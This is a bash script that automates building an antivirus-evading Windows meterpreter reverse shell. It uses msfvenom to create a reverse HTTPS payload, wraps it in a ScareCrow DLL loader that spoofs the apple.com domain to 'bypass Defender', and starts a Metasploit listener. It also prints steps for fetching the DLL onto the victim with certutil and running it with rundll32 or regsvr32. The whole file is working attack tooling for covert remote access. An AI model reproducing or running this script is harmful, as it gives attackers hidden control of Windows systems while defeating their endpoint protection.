#!/bin/bash

lport=443

function usage {
	echo ""
  	echo "Usage: $0 [Options]"
  	echo ""
  	echo "Create a x64 meterpreter to bypass Defender"
  	echo ""
  	echo "Options:"
  	echo "  -h, --help     Show help message."
	echo "  -r, --remove     Remove shell/reverse.exe and reverse.elf files."
  	exit 1
}

function create_directory 
{
	dir=$1
	if [[ ! -d $PWD/$dir ]]
	then
		mkdir $PWD/$dir 
	fi

}

function get_project_info
{

    read -p "Enter Local IP Address: " lhost

}

function download_file
{
	dir=$1
	if [[ -d $PWD/$dir ]]
    then
		cp /opt/shell/ScareCrow_5.1_linux_amd64 $dir

	else
		echo "No $dir directory exists"
		exit
    fi

}

function display_nextsteps
{
	echo ""
	echo "Your next step: "
	echo "Under meterpreter directory, find a dll file, transfer it to your Windows machine, and rename it to something like helloworld.dll" 
	echo "Run the following commands on Windows machine" 
	echo "> certutil -urlcache -split -f http://<IP address>/meterpreter/<some name>.dll" 
	echo "> rundll32 or regsvr32 with DllRegisterServer, DllGetClassObject as export function"
	echo "Enjoy it!" 
}

function create_meterpreter
{
	dir=$1
	if [ "$lhost" != "" ] && [ -d $PWD/$dir ]; then
	
		# show next commands to run... 
		display_nextsteps

		cd meterpreter 
		echo "Creating meterpreter reverse shell and starting msfconsole..."
		msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f raw > reverse.bin
		./ScareCrow_5.1_linux_amd64 -I ./reverse.bin -domain www.apple.com -Loader dll - Exec VirtualAlloc
		

		cd ..
		msfconsole -x "use exploit/multi/handler ; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST $lhost; set LPORT $lport; exploit -j"

	else
		usage
		exit
	fi

}


# Capture the arguments 

while [[ $# -gt 0 ]]; do
  case $1 in
    -h|--help)
      usage
      shift
      ;;
	-r|--remove)
	rm -rf ./meterpreter/*
    shift
	exit
      ;;

    *)
      echo "Invalid option: $1"
      usage
      ;;
  esac
done

get_project_info
create_directory meterpreter 
download_file meterpreter 
create_meterpreter meterpreter

